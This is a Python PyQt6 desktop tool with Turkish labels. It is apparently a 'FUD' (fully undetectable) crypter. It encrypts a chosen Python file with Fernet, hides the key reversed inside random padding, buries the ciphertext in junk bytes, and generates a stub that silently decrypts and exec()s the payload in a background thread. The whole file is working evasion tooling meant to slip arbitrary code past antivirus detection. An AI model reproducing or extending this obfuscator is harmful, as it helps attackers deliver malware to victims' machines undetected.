
from PyQt6 import QtCore, QtGui, QtWidgets
from PyQt6.QtWidgets import QFileDialog, QMessageBox
import os
import random
import string
from cryptography.fernet import Fernet
class Ui_MainWindow(object):
    def __init__(self):
         self.dosya_ismi=""
         self.dosya_yolu=""
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(600, 311)
        self.centralwidget = QtWidgets.QWidget(parent=MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.pushButton = QtWidgets.QPushButton(parent=self.centralwidget)
        self.pushButton.setGeometry(QtCore.QRect(240, 170, 80, 25))
        self.pushButton.setObjectName("pushButton")
        self.lineEdit = QtWidgets.QLineEdit(parent=self.centralwidget)
        self.lineEdit.setGeometry(QtCore.QRect(230, 130, 113, 25))
        self.lineEdit.setObjectName("lineEdit")
        self.label = QtWidgets.QLabel(parent=self.centralwidget)
        self.label.setGeometry(QtCore.QRect(230, 110, 81, 17))
        self.label.setObjectName("label")
        self.pushButton_2 = QtWidgets.QPushButton(parent=self.centralwidget)
        self.pushButton_2.setGeometry(QtCore.QRect(240, 210, 80, 25))
        self.pushButton_2.setObjectName("pushButton_2")
        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtWidgets.QMenuBar(parent=MainWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 600, 22))
        self.menubar.setObjectName("menubar")
        MainWindow.setMenuBar(self.menubar)
        self.statusbar = QtWidgets.QStatusBar(parent=MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setStatusBar(self.statusbar)
        self.pushButton.clicked.connect(self.dosya_sec)
        self.pushButton_2.clicked.connect(self.sifrele)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)
    def sifrele(self):
        if not self.dosya_yolu:
            QMessageBox.warning(None, "Hata", "Lütfen önce bir dosya seçin!")
            return
        
        try:
            print(f"İşlem başlıyor: {self.dosya_yolu}")
            dosya_yolu_dir = os.path.dirname(self.dosya_yolu)
            dosya_adi = self.lineEdit.text() if self.lineEdit.text() else "fud_output.py"
            
            with open(self.dosya_yolu, "rb") as f:
                icerik = f.read()

            key_bytes = Fernet.generate_key()
            fer = Fernet(key_bytes)
            sifreli_veri = fer.encrypt(icerik)

            toplam = string.ascii_letters + string.digits + string.punctuation
            ekleneceksey = "".join(random.choices(toplam, k=10000))
            ekleneceksey2 = "".join(random.choices(toplam, k=10000))
            
            # Junk veriler (çöp veriler)
            cop1 = "".join(random.choices(toplam, k=1000)).encode()
            cop2 = "".join(random.choices(toplam, k=1000)).encode()
            
            # Anahtarı gizleme
            key_str = key_bytes.decode()
            fake_prefix = "".join(random.choices(toplam, k=1000))
            fake_suffix = "".join(random.choices(toplam, k=1000))
            final_key_data = (fake_prefix + key_str + fake_suffix)[::-1]

            # Şifreli veriyi parçala (Fernet imzası ilk 8 bayttır)
            prefix_data = sifreli_veri[:8]
            payload_body = sifreli_veri[8:]
            # Gövdeyi çöple sarmala
            sifreli_veri_obfuscated = cop1 + payload_body + cop2

            yeni_dosya_icerigi = f'''
import os
import time
import threading
from cryptography.fernet import Fernet

_a_ = {ekleneceksey!r}
_k_val = {final_key_data!r}[::-1][1000:-1000]
_b_ = {ekleneceksey2!r}

_p_pre = {prefix_data!r}  # BURASI DÜZELTİLDİ: Gerçek Fernet imzası
_p_body = {sifreli_veri_obfuscated!r}[1000:-1000] # Çöplerden arındırılıyor

def baslat():
    try:
        f = Fernet(_k_val)
        # Orijinal Fernet token yapısını geri kur: imza + gövde
        kod = f.decrypt(_p_pre + _p_body)
        exec(kod, globals())
    except Exception as e:
        pass

if __name__ == "__main__":
    t = threading.Thread(target=baslat)
    t.daemon = True
    t.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
'''
            with open(os.path.join(dosya_yolu_dir, dosya_adi), "w", encoding="utf-8") as f:
                f.write(yeni_dosya_icerigi)
            
            QMessageBox.information(None, "Başarılı", f"Dosya oluşturuldu: {dosya_adi}")
            
        except Exception as e:
            QMessageBox.critical(None, "Hata", f"Hata: {str(e)}")

    def dosya_sec(self):

           
            dosya_yolu, _ = QFileDialog.getOpenFileName(
                None, 
                "Dosya Seç", 
                "", 
                "Python Dosyaları (*.py);;Tüm Dosyalar (*)"
            )
            
            if dosya_yolu:
                dosya_adi = os.path.basename(dosya_yolu)
                self.pushButton.setText(f"Seçilen: {dosya_adi}")
                self.dosya_ismi = dosya_adi
                self.dosya_yolu = dosya_yolu
    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "MainWindow"))
        self.pushButton.setText(_translate("MainWindow", "dosya sec"))
        self.lineEdit.setText(_translate("MainWindow", "fud.py"))
        self.label.setText(_translate("MainWindow", "dosya ismi:"))
        self.pushButton_2.setText(_translate("MainWindow", "sifrele"))
if __name__=="__main__":
        import sys
        app = QtWidgets.QApplication(sys.argv)
        
        ana_pencere = QtWidgets.QMainWindow() 
        
    
        ui = Ui_MainWindow() 
        
       
        ui.setupUi(ana_pencere) 
        
       
        ana_pencere.show() 
        
        sys.exit(app.exec())
